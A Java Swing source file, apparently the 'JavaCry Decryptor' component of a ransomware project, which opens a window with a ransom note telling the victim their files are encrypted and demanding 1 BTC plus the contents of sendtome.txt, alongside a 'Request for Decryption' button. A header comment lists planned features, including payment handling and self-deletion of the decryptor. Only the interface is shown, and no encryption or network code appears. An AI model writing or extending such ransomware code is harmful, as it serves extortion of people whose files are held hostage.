import java.awt.*;
import javax.swing.*;

/*
  decryptor:
  BTC payment interface
  Request for decryption functionality
  if receives the key, use the key to decrypt the files
  destroy decryptor.java
*/

class Decryptor {
  private static int id = 0;
   // initializing using constructor
   Decryptor() {
      String note = String.join("\n"
         , "<html>"
         , ""
         , "<h1>Your files have been encrypted.</h1>"
         , "<p>"
         , "Your files have been encrypted. If you want to decrypt your files, please copy the content of sendtome.txt send it with $1 BTC to address. You can generate the transaction output with <address>https://btcmessage.com/</address>, and copy it to your BTC wallet to send me your money. I will check the payments before I approve your request for decryption."
         , "</p>"
         , "</html>"
);
      JFrame f = new JFrame();
      JPanel panel = new JPanel(new FlowLayout());
      JLabel html = new JLabel(note, JLabel.LEFT);

      // creating a Button
      JButton b = new JButton("Request for Decryption");


      // setting position of above components in the frame
      b.setBounds(100, 150, 200, 30);
      panel.setLayout(new FlowLayout());

      // adding components into frame
      f.add(b);
      panel.add(html);
      f.getContentPane().add(panel);

      // frame size 300 width and 300 height
      f.setSize(1200,600);

      // setting the title of frame
      f.setTitle("JavaCry Decryptor");
      f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

      // setting visibility of frame
      f.setVisible(true);
}

// main method
public static void main(String args[]) {

// creating instance of Frame class
Decryptor awt_obj = new Decryptor();
}

}
